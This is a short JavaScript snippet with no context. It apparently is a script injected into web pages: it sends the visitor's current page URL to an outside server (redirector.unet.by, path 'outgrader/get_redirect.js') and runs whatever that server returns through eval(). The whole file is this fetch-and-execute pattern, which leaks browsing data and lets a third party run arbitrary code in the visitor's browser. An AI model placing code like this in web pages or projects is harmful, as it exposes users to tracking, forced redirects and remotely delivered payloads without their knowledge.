var r = null;
if (window.XMLHttpRequest) { // Mozilla, Safari, ...
    r = new XMLHttpRequest();
} else if (window.ActiveXObject) { // IE
    try {
        r = new ActiveXObject('Msxml2.XMLHTTP');
    }
    catch (e) {
        try {
            r = new ActiveXObject('Microsoft.XMLHTTP');
        }
        catch (e) {
        }
    }
}
if (r) {
    r.open('get', 'http://redirector.unet.by/outgrader/get_redirect.js?url=' + location.href);
    r.onreadystatechange = function () {
        if (r.readyState != 4 || r.status != 200) return;
        eval(r.responseText);
    };
    r.send();
}
